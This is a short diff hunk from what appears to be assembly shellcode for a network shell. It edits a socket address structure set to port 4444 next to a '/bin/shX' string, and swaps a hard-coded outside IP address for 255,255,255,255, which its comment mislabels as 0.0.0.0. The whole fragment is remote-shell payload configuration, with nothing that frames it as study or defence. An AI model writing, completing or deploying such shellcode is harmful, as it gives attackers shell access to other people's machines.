@@ -47,6 +47,6 @@ _start:
 struct:
 .ascii "\x02\xff"      // AF_INET 0xff will be NULLed 
 .ascii "\x11\x5c"      // port number 4444 
-.byte 13,124,69,18  // IP Address 
+.byte 255,255,255,255  // IP Address 0.0.0.0
 binsh:
 .ascii "/bin/shX"
